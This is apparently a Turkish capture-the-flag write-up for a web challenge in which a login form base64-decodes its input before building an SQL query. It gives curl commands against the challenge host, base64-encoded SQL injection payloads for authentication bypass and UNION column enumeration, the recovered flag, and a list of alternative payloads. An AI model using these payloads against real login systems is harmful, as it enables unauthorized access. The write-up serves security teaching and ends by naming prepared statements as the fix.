# Injection2

injection2 - Web Challenge
Açıklama
Login formunda Base64 encoding bypass yaparak SQL Injection zafiyetini kullanıp flag elde etmek. Uygulama girdileri Base64 decode ediyor ancak SQL injection'a karşı korumasız.
Çözüm

Challenge URL'ine erişildi: http://64.226.74.243:10002/
Form yapısı cURL ile incelendi:

bashcurl http://64.226.74.243:10002/

Response'da önemli bir ipucu tespit edildi:

Hint: "We do some encoding for your safety 😉"
Method: POST
Parametreler: username ve password


Klasik SQL Injection payloadu test edildi ancak başarısız oldu:

bashcurl -X POST http://64.226.74.243:10002/ -d "username=' OR '1'='1" -d "password=test"

UNION injection ile encoding tipi keşfedildi:

bashcurl -X POST http://64.226.74.243:10002/ -d "username=' UNION SELECT NULL,NULL--" -d "password=test"

SQL hatası alındı: ??^??(??? → Base64 decode ediliyor!


Payload Base64 ile encode edildi:

bashecho -n "admin' OR '1'='1'-- " | base64
# Output: YWRtaW4nIE9SICcxJz0nMSctLSA=

Base64 encoded payload ile exploit yapıldı:

bashcurl -X POST http://64.226.74.243:10002/ -d "username=YWRtaW4nIE9SICcxJz0nMSctLSA=" -d "password=test"

Authentication bypass başarılı oldu ve flag elde edildi
Bonus: UNION injection ile tablo yapısı keşfedildi (3 sütun):

bashecho -n "' UNION SELECT NULL,NULL,NULL-- " | base64
curl -X POST http://64.226.74.243:10002/ -d "username=JyBVTklPTiBTRUxFQ1QgTlVMTCxOVUxMLE5VTEwtLSA=" -d "password=test"
Flag
FLAG{base64_guvenli_degilmis_sqli64_success}
Öğrenilenler

Base64 encoding bypass teknikleri
Encoding ≠ Security prensibi
SQL Injection + Encoding kombinasyonu
UNION-based SQL Injection
Column number enumeration
Base64 encoding/decoding
Error-based SQL detection

Kullanılan Araçlar

curl - HTTP client
base64 - Base64 encoding
echo - String manipulation
Terminal

Zorluk
⭐ Orta seviye
Notlar
Challenge, encoding'in güvenlik önlemi olmadığını gösteriyor. Güvensiz kod: base64_decode() sonrası prepared statement kullanmadan direkt SQL'e ekleniyor. Base64 sadece bir encoding yöntemidir, sanitizasyon veya güvenlik önlemi değildir. Production'da mutlaka prepared statements kullanılmalı.
Exploit Detayı:
sql-- Base64 payload: YWRtaW4nIE9SICcxJz0nMSctLSA=
-- Decode sonucu: admin' OR '1'='1'-- 
-- Oluşan sorgu:
SELECT * FROM users WHERE username = 'admin' OR '1'='1'--' AND password = ''

-- Gerçekte çalışan:
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
-- (OR '1'='1' her zaman TRUE, password kontrolü yorum satırı)
Alternatif Başarılı Payloadlar:
bash# Payload: ' OR 1=1-- 
echo -n "' OR 1=1-- " | base64  # JyBPUiAxPTEtLSA=

# Payload: ' OR '1'='1
echo -n "' OR '1'='1" | base64  # JyBPUiAnMSc9JzE=

# Payload: admin' OR '1'='1'#
echo -n "admin' OR '1'='1'#" | base64  # YWRtaW4nIE9SICcxJz0nMScj
